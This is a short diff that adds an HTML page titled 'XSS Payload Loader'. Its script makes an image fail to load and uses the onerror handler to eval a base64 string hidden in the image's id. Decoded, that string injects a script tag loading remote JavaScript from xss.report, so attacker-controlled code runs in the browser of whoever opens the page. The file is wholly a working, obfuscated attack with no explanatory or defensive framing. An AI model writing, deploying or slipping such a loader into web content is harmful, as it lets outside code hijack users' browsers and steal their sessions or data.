@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Payload Loader</title>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            let img = document.createElement("img");
+            img.setAttribute("src", "x");
+            img.setAttribute("id", "dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7");
+            img.setAttribute("onerror", "eval(atob(this.id))");
+            document.body.appendChild(img);
+        };
+    </script>
+</body>
+</html>
